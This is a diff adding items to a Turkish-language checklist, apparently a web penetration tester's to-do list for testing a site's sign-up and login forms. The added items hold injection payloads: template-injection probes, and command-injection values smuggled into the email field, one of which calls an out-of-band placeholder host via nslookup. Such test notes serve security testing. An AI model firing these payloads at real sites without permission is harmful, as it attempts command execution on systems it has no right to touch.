@@ -4,6 +4,11 @@
 ## Rozet Stili Butonlar
 
 ## Yapılacaklar Listesi
+### SIGN UP
+- [ ] Kayit olma asamasinda SSTI dene ve mailine gelen kisimda isleme girmis mi bak <%= 7*7 %> %{8*8}
+- [ ] Mail kisminda json verisi olarak mumkunse cift mail gir ikisinede gelecek mi?
+- [ ] Mail kisminda ;sleep+10; denemesi yap Command injection |whoami -- ||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+- [ ] 
 
 ### LOGIN
 - [ ] Login kisminda mail icin ping denemsi : @mail ||ping+-c+10+127.0.0.1||
